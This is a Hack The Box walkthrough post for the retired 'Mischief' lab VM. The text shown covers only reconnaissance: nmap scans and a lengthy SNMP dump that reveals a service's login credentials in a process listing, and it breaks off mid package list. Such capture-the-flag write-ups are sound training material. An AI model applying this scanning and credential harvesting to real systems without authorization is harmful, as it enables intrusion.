---
layout: post
title: "Mischief: Hack The Box Walkthrough"
date: 2019-01-05 16:32:15 +0000
last_modified_at: 2019-01-05 16:53:58 +0000
category: Walkthrough
tags: ["Hack The Box", Mischief, retired]
comments: true
image:
  feature: mischief-htb-walkthrough.jpg
  credit: NeuPaddy / Pixabay
  creditlink: https://pixabay.com/en/snowman-smile-consider-wag-prank-1832316/
---

This post documents the complete walkthrough of Mischief, a retired vulnerable [VM][1] created by [trickster0][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Mischief is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.92
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  syn-ack ttl 63 Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth:
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
```

Following the route of `3366/tcp`, I stumbled upon Python's SimpleHTTPServer with Basic authentication enabled. I had no choice but to dig deeper further for UDP open ports. The first go-to port has to be SNMP or `161/udp`.

```
# nmap -n -v -Pn -sU -p161 -A --reason -oN udp.txt 10.10.10.92
...
PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: b6a9f84e18fef95a00000000
|   snmpEngineBoots: 19
|_  snmpEngineTime: 18m28s
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.10.10.92  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:5e:f7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Status: up
|_    Traffic stats: 5.94 Mb sent, 23.42 Mb received
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:3366         0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:37256        *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes:
|   1:
|     Name: systemd
|     Path: /sbin/init
|     Params: maybe-ubiquity
|   2:
|     Name: kthreadd
|   4:
|     Name: kworker/0:0H
|   5:
|     Name: kworker/u2:0
|   6:
|     Name: mm_percpu_wq
|   7:
|     Name: ksoftirqd/0
|   8:
|     Name: rcu_sched
|   9:
|     Name: rcu_bh
|   10:
|     Name: migration/0
|   11:
|     Name: watchdog/0
|   12:
|     Name: cpuhp/0
|   13:
|     Name: kdevtmpfs
|   14:
|     Name: netns
|   15:
|     Name: rcu_tasks_kthre
|   16:
|     Name: kauditd
|   17:
|     Name: khungtaskd
|   18:
|     Name: oom_reaper
|   19:
|     Name: writeback
|   20:
|     Name: kcompactd0
|   21:
|     Name: ksmd
|   22:
|     Name: khugepaged
|   23:
|     Name: crypto
|   24:
|     Name: kintegrityd
|   25:
|     Name: kblockd
|   26:
|     Name: ata_sff
|   27:
|     Name: md
|   28:
|     Name: edac-poller
|   29:
|     Name: devfreq_wq
|   30:
|     Name: watchdogd
|   31:
|     Name: kworker/u2:1
|   32:
|     Name: kworker/0:1
|   34:
|     Name: kswapd0
|   35:
|     Name: ecryptfs-kthrea
|   77:
|     Name: kthrotld
|   78:
|     Name: acpi_thermal_pm
|   79:
|     Name: scsi_eh_0
|   80:
|     Name: scsi_tmf_0
|   81:
|     Name: scsi_eh_1
|   82:
|     Name: scsi_tmf_1
|   88:
|     Name: ipv6_addrconf
|   97:
|     Name: kstrp
|   114:
|     Name: charger_manager
|   125:
|     Name: kworker/0:2
|   164:
|     Name: mpt_poll_0
|   165:
|     Name: mpt/0
|   194:
|     Name: scsi_eh_2
|   197:
|     Name: scsi_tmf_2
|   205:
|     Name: kworker/0:1H
|   206:
|     Name: ttm_swap
|   207:
|     Name: irq/16-vmwgfx
|   274:
|     Name: raid5wq
|   324:
|     Name: jbd2/sda2-8
|   325:
|     Name: ext4-rsv-conver
|   372:
|     Name: vmtoolsd
|     Path: /usr/bin/vmtoolsd
|   375:
|     Name: systemd-journal
|     Path: /lib/systemd/systemd-journald
|   378:
|     Name: iscsi_eh
|   382:
|     Name: lvmetad
|     Path: /sbin/lvmetad
|     Params: -f
|   389:
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|   392:
|     Name: ib-comp-wq
|   393:
|     Name: ib_mcast
|   394:
|     Name: ib_nl_sa_wq
|   405:
|     Name: rdma_cm
|   476:
|     Name: systemd-network
|     Path: /lib/systemd/systemd-networkd
|   515:
|     Name: systemd-resolve
|     Path: /lib/systemd/systemd-resolved
|   517:
|     Name: systemd-timesyn
|     Path: /lib/systemd/systemd-timesyncd
|   536:
|     Name: accounts-daemon
|     Path: /usr/lib/accountsservice/accounts-daemon
|   541:
|     Name: atd
|     Path: /usr/sbin/atd
|     Params: -f
|   542:
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   543:
|     Name: rsyslogd
|     Path: /usr/sbin/rsyslogd
|     Params: -n
|   549:
|     Name: cron
|     Path: /usr/sbin/cron
|     Params: -f
|   550:
|     Name: cron
|     Path: /usr/sbin/CRON
|     Params: -f
|   551:
|     Name: sh
|     Path: /bin/sh
|     Params: -c /home/loki/hosted/webstart.sh
|   553:
|     Name: lxcfs
|     Path: /usr/bin/lxcfs
|     Params: /var/lib/lxcfs/
|   557:
|     Name: sh
|     Path: /bin/sh
|     Params: /home/loki/hosted/webstart.sh
|   560:
|     Name: python
|     Path: python
|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
|   563:
|     Name: networkd-dispat
|     Path: /usr/bin/python3
|     Params: /usr/bin/networkd-dispatcher
|   564:
|     Name: dbus-daemon
|     Path: /usr/bin/dbus-daemon
|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
|   572:
|     Name: VGAuthService
|     Path: /usr/bin/VGAuthService
|   574:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
|   590:
|     Name: polkitd
|     Path: /usr/lib/policykit-1/polkitd
|     Params: --no-debug
|   632:
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|     Params: --daemonize --pid-file=/run/mysqld/mysqld.pid
|   694:
|     Name: iscsid
|     Path: /sbin/iscsid
|   695:
|     Name: iscsid
|     Path: /sbin/iscsid
|   701:
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: -D
|   739:
|     Name: agetty
|     Path: /sbin/agetty
|     Params: -o -p -- \u --noclear tty1 linux
|   778:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   781:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   782:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   783:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   784:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   785:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   979:
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1005:
|     Name: sshd
|     Path: sshd: loki [priv]
|   1009:
|     Name: systemd
|     Path: /lib/systemd/systemd
|     Params: --user
|   1014:
|     Name: (sd-pam)
|     Path: (sd-pam)
|   1134:
|     Name: sshd
|     Path: sshd: loki@pts/0
|   1137:
|     Name: bash
|     Path: -bash
|   1161:
|     Name: sshd
|     Path: sshd: loki [priv]
|   1242:
|     Name: sshd
|     Path: sshd: loki@pts/1
|   1243:
|     Name: bash
|     Path: -bash
|   1268:
|_    Name: kworker/u2:2
| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
|_  System uptime: 18m28.52s (110852 timeticks)
| snmp-win32-software:
|   accountsservice-0.6.45-1ubuntu1; 0-01-01T00:00:00
|   acl-2.2.52-3build1; 0-01-01T00:00:00
|   acpid-1:2.0.28-1ubuntu1; 0-01-01T00:00:00
|   adduser-3.116ubuntu1; 0-01-01T00:00:00
|   apache2-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-bin-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-data-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apache2-utils-2.4.29-1ubuntu4.1; 0-01-01T00:00:00
|   apparmor-2.12-4ubuntu5; 0-01-01T00:00:00
|   apport-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   apport-symptoms-0.20; 0-01-01T00:00:00
|   apt-1.6.1; 0-01-01T00:00:00
|   apt-utils-1.6.1; 0-01-01T00:00:00
|   at-3.1.20-3.1ubuntu2; 0-01-01T00:00:00
|   base-files-10.1ubuntu2; 0-01-01T00:00:00
|   base-passwd-3.5.44; 0-01-01T00:00:00
|   bash-4.4.18-2ubuntu1; 0-01-01T00:00:00
|   bash-completion-1:2.8-1ubuntu1; 0-01-01T00:00:00
|   bc-1.07.1-2; 0-01-01T00:00:00
|   bcache-tools-1.0.8-2build1; 0-01-01T00:00:00
|   bind9-host-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   binutils-2.30-15ubuntu1; 0-01-01T00:00:00
|   binutils-common-2.30-15ubuntu1; 0-01-01T00:00:00
|   binutils-x86-64-linux-gnu-2.30-15ubuntu1; 0-01-01T00:00:00
|   bsdmainutils-11.1.2ubuntu1; 0-01-01T00:00:00
|   bsdutils-1:2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   btrfs-progs-4.15.1-1build1; 0-01-01T00:00:00
|   btrfs-tools-4.15.1-1build1; 0-01-01T00:00:00
|   build-essential-12.4ubuntu1; 0-01-01T00:00:00
|   busybox-initramfs-1:1.27.2-2ubuntu3; 0-01-01T00:00:00
|   busybox-static-1:1.27.2-2ubuntu3; 0-01-01T00:00:00
|   byobu-5.125-0ubuntu1; 0-01-01T00:00:00
|   bzip2-1.0.6-8.1; 0-01-01T00:00:00
|   ca-certificates-20180409; 0-01-01T00:00:00
|   cloud-guest-utils-0.30-0ubuntu5; 0-01-01T00:00:00
|   cloud-init-18.2-14-g6d48d265-0ubuntu1; 0-01-01T00:00:00
|   cloud-initramfs-copymods-0.40ubuntu1; 0-01-01T00:00:00
|   cloud-initramfs-dyn-netconf-0.40ubuntu1; 0-01-01T00:00:00
|   command-not-found-18.04.4; 0-01-01T00:00:00
|   command-not-found-data-18.04.4; 0-01-01T00:00:00
|   console-setup-1.178ubuntu2; 0-01-01T00:00:00
|   console-setup-linux-1.178ubuntu2; 0-01-01T00:00:00
|   coreutils-8.28-1ubuntu1; 0-01-01T00:00:00
|   cpio-2.12+dfsg-6; 0-01-01T00:00:00
|   cpp-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   cpp-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   crda-3.18-1build1; 0-01-01T00:00:00
|   cron-3.0pl1-128.1ubuntu1; 0-01-01T00:00:00
|   cryptsetup-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   cryptsetup-bin-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   curl-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   dash-0.5.8-2.10; 0-01-01T00:00:00
|   dbus-1.12.2-1ubuntu1; 0-01-01T00:00:00
|   debconf-1.5.66; 0-01-01T00:00:00
|   debconf-i18n-1.5.66; 0-01-01T00:00:00
|   debianutils-4.8.4; 0-01-01T00:00:00
|   diffutils-1:3.6-1; 0-01-01T00:00:00
|   dirmngr-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   distro-info-data-0.37ubuntu0.1; 0-01-01T00:00:00
|   dmeventd-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   dmidecode-3.1-1; 0-01-01T00:00:00
|   dmsetup-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   dns-root-data-2018013001; 0-01-01T00:00:00
|   dnsmasq-base-2.79-1; 0-01-01T00:00:00
|   dnsutils-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   dosfstools-4.1-1; 0-01-01T00:00:00
|   dpkg-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   dpkg-dev-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   e2fsprogs-1.44.1-1; 0-01-01T00:00:00
|   eatmydata-105-6; 0-01-01T00:00:00
|   ebtables-2.0.10.4-3.5ubuntu2; 0-01-01T00:00:00
|   ed-1.10-2.1; 0-01-01T00:00:00
|   eject-2.1.5+deb1+cvs20081104-13.2; 0-01-01T00:00:00
|   ethtool-1:4.15-0ubuntu1; 0-01-01T00:00:00
|   fakeroot-1.22-2ubuntu1; 0-01-01T00:00:00
|   fdisk-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   file-1:5.32-2; 0-01-01T00:00:00
|   findutils-4.6.0+git+20170828-2; 0-01-01T00:00:00
|   fonts-ubuntu-console-0.83-2; 0-01-01T00:00:00
|   friendly-recovery-0.2.38; 0-01-01T00:00:00
|   ftp-0.17-34; 0-01-01T00:00:00
|   fuse-2.9.7-1ubuntu1; 0-01-01T00:00:00
|   g++-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   g++-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gawk-1:4.1.4+dfsg-1build1; 0-01-01T00:00:00
|   gcc-4:7.3.0-3ubuntu2; 0-01-01T00:00:00
|   gcc-7-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gcc-7-base-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   gcc-8-base-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   gdisk-1.0.3-1; 0-01-01T00:00:00
|   geoip-database-20180315-1; 0-01-01T00:00:00
|   gettext-base-0.19.8.1-6; 0-01-01T00:00:00
|   gir1.2-glib-2.0-1.56.1-1; 0-01-01T00:00:00
|   git-1:2.17.0-1ubuntu1; 0-01-01T00:00:00
|   git-man-1:2.17.0-1ubuntu1; 0-01-01T00:00:00
|   gnupg-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gnupg-l10n-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gnupg-utils-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-agent-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-wks-client-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpg-wks-server-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgconf-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgsm-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   gpgv-2.2.4-1ubuntu1; 0-01-01T00:00:00
|   grep-3.1-2; 0-01-01T00:00:00
|   groff-base-1.22.3-10; 0-01-01T00:00:00
|   grub-common-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub-gfxpayload-lists-0.7; 0-01-01T00:00:00
|   grub-legacy-ec2-1:1; 0-01-01T00:00:00
|   grub-pc-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub-pc-bin-2.02-2ubuntu8; 0-01-01T00:00:00
|   grub2-common-2.02-2ubuntu8; 0-01-01T00:00:00
|   gzip-1.6-5ubuntu1; 0-01-01T00:00:00
|   hdparm-9.54+ds-1; 0-01-01T00:00:00
|   hostname-3.20; 0-01-01T00:00:00
|   htop-2.1.0-3; 0-01-01T00:00:00
|   info-6.5.0.dfsg.1-2; 0-01-01T00:00:00
|   init-1.51; 0-01-01T00:00:00
|   init-system-helpers-1.51; 0-01-01T00:00:00
|   initramfs-tools-0.130ubuntu3; 0-01-01T00:00:00
|   initramfs-tools-bin-0.130ubuntu3; 0-01-01T00:00:00
|   initramfs-tools-core-0.130ubuntu3; 0-01-01T00:00:00
|   install-info-6.5.0.dfsg.1-2; 0-01-01T00:00:00
|   iproute2-4.15.0-2ubuntu1; 0-01-01T00:00:00
|   iptables-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   iptables-persistent-1.0.4+nmu2; 0-01-01T00:00:00
|   iputils-ping-3:20161105-1ubuntu2; 0-01-01T00:00:00
|   iputils-tracepath-3:20161105-1ubuntu2; 0-01-01T00:00:00
|   irqbalance-1.3.0-0.1; 0-01-01T00:00:00
|   isc-dhcp-client-4.3.5-3ubuntu7; 0-01-01T00:00:00
|   isc-dhcp-common-4.3.5-3ubuntu7; 0-01-01T00:00:00
|   iso-codes-3.79-1; 0-01-01T00:00:00
|   iw-4.14-0.1; 0-01-01T00:00:00
|   kbd-2.0.4-2ubuntu1; 0-01-01T00:00:00
|   keyboard-configuration-1.178ubuntu2; 0-01-01T00:00:00
|   klibc-utils-2.0.4-9ubuntu2; 0-01-01T00:00:00
|   kmod-24-1ubuntu3; 0-01-01T00:00:00
|   krb5-locales-1.16-2build1; 0-01-01T00:00:00
|   landscape-common-18.01-0ubuntu3; 0-01-01T00:00:00
|   language-selector-common-0.188; 0-01-01T00:00:00
|   less-487-0.1; 0-01-01T00:00:00
|   libaccountsservice0-0.6.45-1ubuntu1; 0-01-01T00:00:00
|   libacl1-2.2.52-3build1; 0-01-01T00:00:00
|   libaio1-0.3.110-5; 0-01-01T00:00:00
|   libalgorithm-diff-perl-1.19.03-1; 0-01-01T00:00:00
|   libalgorithm-diff-xs-perl-0.04-5; 0-01-01T00:00:00
|   libalgorithm-merge-perl-0.08-3; 0-01-01T00:00:00
|   libapache2-mod-php-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   libapache2-mod-php7.2-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   libapparmor1-2.12-4ubuntu5; 0-01-01T00:00:00
|   libapr1-1.6.3-2; 0-01-01T00:00:00
|   libaprutil1-1.6.1-2; 0-01-01T00:00:00
|   libaprutil1-dbd-sqlite3-1.6.1-2; 0-01-01T00:00:00
|   libaprutil1-ldap-1.6.1-2; 0-01-01T00:00:00
|   libapt-inst2.0-1.6.1; 0-01-01T00:00:00
|   libapt-pkg5.0-1.6.1; 0-01-01T00:00:00
|   libargon2-0-0~20161029-1.1; 0-01-01T00:00:00
|   libasan4-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libasn1-8-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libassuan0-2.5.1-2; 0-01-01T00:00:00
|   libatm1-1:2.5.1-2build1; 0-01-01T00:00:00
|   libatomic1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libattr1-1:2.4.47-2build1; 0-01-01T00:00:00
|   libaudit-common-1:2.8.2-1ubuntu1; 0-01-01T00:00:00
|   libaudit1-1:2.8.2-1ubuntu1; 0-01-01T00:00:00
|   libbind9-160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libbinutils-2.30-15ubuntu1; 0-01-01T00:00:00
|   libblkid1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libbsd0-0.8.7-1; 0-01-01T00:00:00
|   libbz2-1.0-1.0.6-8.1; 0-01-01T00:00:00
|   libc-bin-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc-dev-bin-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc6-2.27-3ubuntu1; 0-01-01T00:00:00
|   libc6-dev-2.27-3ubuntu1; 0-01-01T00:00:00
|   libcap-ng0-0.7.7-3.1; 0-01-01T00:00:00
|   libcap2-1:2.25-1.2; 0-01-01T00:00:00
|   libcap2-bin-1:2.25-1.2; 0-01-01T00:00:00
|   libcc1-0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libcgi-fast-perl-1:2.13-1; 0-01-01T00:00:00
|   libcgi-pm-perl-4.38-1; 0-01-01T00:00:00
|   libcilkrts5-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libcom-err2-1.44.1-1; 0-01-01T00:00:00
|   libcryptsetup12-2:2.0.2-1ubuntu1; 0-01-01T00:00:00
|   libcurl3-gnutls-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   libcurl4-7.58.0-2ubuntu3; 0-01-01T00:00:00
|   libdb5.3-5.3.28-13.1ubuntu1; 0-01-01T00:00:00
|   libdbus-1-3-1.12.2-1ubuntu1; 0-01-01T00:00:00
|   libdbus-glib-1-2-0.110-2; 0-01-01T00:00:00
|   libdebconfclient0-0.213ubuntu1; 0-01-01T00:00:00
|   libdevmapper-event1.02.1-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   libdevmapper1.02.1-2:1.02.145-4.1ubuntu3; 0-01-01T00:00:00
|   libdns-export1100-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libdns1100-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libdpkg-perl-1.19.0.5ubuntu2; 0-01-01T00:00:00
|   libdrm-common-2.4.91-2; 0-01-01T00:00:00
|   libdrm2-2.4.91-2; 0-01-01T00:00:00
|   libdumbnet1-1.12-7build1; 0-01-01T00:00:00
|   libeatmydata1-105-6; 0-01-01T00:00:00
|   libedit2-3.1-20170329-1; 0-01-01T00:00:00
|   libelf1-0.170-0.4; 0-01-01T00:00:00
|   libencode-locale-perl-1.05-1; 0-01-01T00:00:00
|   liberror-perl-0.17025-1; 0-01-01T00:00:00
|   libestr0-0.1.10-2.1; 0-01-01T00:00:00
|   libevent-2.1-6-2.1.8-stable-4build1; 0-01-01T00:00:00
|   libevent-core-2.1-6-2.1.8-stable-4build1; 0-01-01T00:00:00
|   libexpat1-2.2.5-3; 0-01-01T00:00:00
|   libexpat1-dev-2.2.5-3; 0-01-01T00:00:00
|   libext2fs2-1.44.1-1; 0-01-01T00:00:00
|   libfakeroot-1.22-2ubuntu1; 0-01-01T00:00:00
|   libfastjson4-0.99.8-2; 0-01-01T00:00:00
|   libfcgi-perl-0.78-2build1; 0-01-01T00:00:00
|   libfdisk1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libffi6-3.2.1-8; 0-01-01T00:00:00
|   libfile-fcntllock-perl-0.22-3build2; 0-01-01T00:00:00
|   libfreetype6-2.8.1-2ubuntu2; 0-01-01T00:00:00
|   libfribidi0-0.19.7-2; 0-01-01T00:00:00
|   libfuse2-2.9.7-1ubuntu1; 0-01-01T00:00:00
|   libgcc-7-dev-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libgcc1-1:8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libgcrypt20-1.8.1-4ubuntu1; 0-01-01T00:00:00
|   libgdbm-compat4-1.14.1-6; 0-01-01T00:00:00
|   libgdbm5-1.14.1-6; 0-01-01T00:00:00
|   libgeoip1-1.6.12-1; 0-01-01T00:00:00
|   libgirepository-1.0-1-1.56.1-1; 0-01-01T00:00:00
|   libglib2.0-0-2.56.1-2ubuntu1; 0-01-01T00:00:00
|   libglib2.0-data-2.56.1-2ubuntu1; 0-01-01T00:00:00
|   libgmp10-2:6.1.2+dfsg-2; 0-01-01T00:00:00
|   libgnutls30-3.5.18-1ubuntu1; 0-01-01T00:00:00
|   libgomp1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libgpg-error0-1.27-6; 0-01-01T00:00:00
|   libgpm2-1.20.7-5; 0-01-01T00:00:00
|   libgssapi-krb5-2-1.16-2build1; 0-01-01T00:00:00
|   libgssapi3-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libhcrypto4-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libheimbase1-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libheimntlm0-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libhogweed4-3.4-1; 0-01-01T00:00:00
|   libhtml-parser-perl-3.72-3build1; 0-01-01T00:00:00
|   libhtml-tagset-perl-3.20-3; 0-01-01T00:00:00
|   libhtml-template-perl-2.97-1; 0-01-01T00:00:00
|   libhttp-date-perl-6.02-1; 0-01-01T00:00:00
|   libhttp-message-perl-6.14-1; 0-01-01T00:00:00
|   libhx509-5-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libicu60-60.2-3ubuntu3; 0-01-01T00:00:00
|   libidn11-1.33-2.1ubuntu1; 0-01-01T00:00:00
|   libidn2-0-2.0.4-1.1build2; 0-01-01T00:00:00
|   libio-html-perl-1.001-1; 0-01-01T00:00:00
|   libip4tc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libip6tc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libiptc0-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libirs160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisc-export169-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisc169-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisccc160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisccfg160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libisl19-0.19-1; 0-01-01T00:00:00
|   libisns0-0.97-2build1; 0-01-01T00:00:00
|   libitm1-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libjson-c3-0.12.1-1.3; 0-01-01T00:00:00
|   libk5crypto3-1.16-2build1; 0-01-01T00:00:00
|   libkeyutils1-1.5.9-9.2ubuntu2; 0-01-01T00:00:00
|   libklibc-2.0.4-9ubuntu2; 0-01-01T00:00:00
|   libkmod2-24-1ubuntu3; 0-01-01T00:00:00
|   libkrb5-26-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libkrb5-3-1.16-2build1; 0-01-01T00:00:00
|   libkrb5support0-1.16-2build1; 0-01-01T00:00:00
|   libksba8-1.3.5-2; 0-01-01T00:00:00
|   libldap-2.4-2-2.4.45+dfsg-1ubuntu1; 0-01-01T00:00:00
|   libldap-common-2.4.45+dfsg-1ubuntu1; 0-01-01T00:00:00
|   liblocale-gettext-perl-1.07-3build2; 0-01-01T00:00:00
|   liblsan0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   liblua5.2-0-5.2.4-1.1build1; 0-01-01T00:00:00
|   liblvm2app2.2-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   liblvm2cmd2.02-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   liblwp-mediatypes-perl-6.02-1; 0-01-01T00:00:00
|   liblwres160-1:9.11.3+dfsg-1ubuntu1; 0-01-01T00:00:00
|   liblxc-common-3.0.0-0ubuntu2; 0-01-01T00:00:00
|   liblxc1-3.0.0-0ubuntu2; 0-01-01T00:00:00
|   liblz4-1-0.0~r131-2ubuntu3; 0-01-01T00:00:00
|   liblzma5-5.2.2-1.3; 0-01-01T00:00:00
|   liblzo2-2-2.08-1.2; 0-01-01T00:00:00
|   libmagic-mgc-1:5.32-2; 0-01-01T00:00:00
|   libmagic1-1:5.32-2; 0-01-01T00:00:00
|   libmnl0-1.0.4-2; 0-01-01T00:00:00
|   libmount1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libmpc3-1.1.0-1; 0-01-01T00:00:00
|   libmpdec2-2.4.2-1ubuntu1; 0-01-01T00:00:00
|   libmpfr6-4.0.1-1; 0-01-01T00:00:00
|   libmpx2-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libmspack0-0.6-3; 0-01-01T00:00:00
|   libncurses5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libncursesw5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libnetfilter-conntrack3-1.0.6-2; 0-01-01T00:00:00
|   libnettle6-3.4-1; 0-01-01T00:00:00
|   libnewt0.52-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   libnfnetlink0-1.0.1-3; 0-01-01T00:00:00
|   libnghttp2-14-1.30.0-1ubuntu1; 0-01-01T00:00:00
|   libnih1-1.0.3-6ubuntu2; 0-01-01T00:00:00
|   libnl-3-200-3.2.29-0ubuntu3; 0-01-01T00:00:00
|   libnl-genl-3-200-3.2.29-0ubuntu3; 0-01-01T00:00:00
|   libnpth0-1.5-3; 0-01-01T00:00:00
|   libnss-systemd-237-3ubuntu10; 0-01-01T00:00:00
|   libntfs-3g88-1:2017.3.23-2; 0-01-01T00:00:00
|   libnuma1-2.0.11-2.1; 0-01-01T00:00:00
|   libp11-kit0-0.23.9-2; 0-01-01T00:00:00
|   libpam-cap-1:2.25-1.2; 0-01-01T00:00:00
|   libpam-modules-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-modules-bin-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-runtime-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
|   libpam-systemd-237-3ubuntu10; 0-01-01T00:00:00
|   libpam0g-1.1.8-3.6ubuntu2; 0-01-01T00:00:00
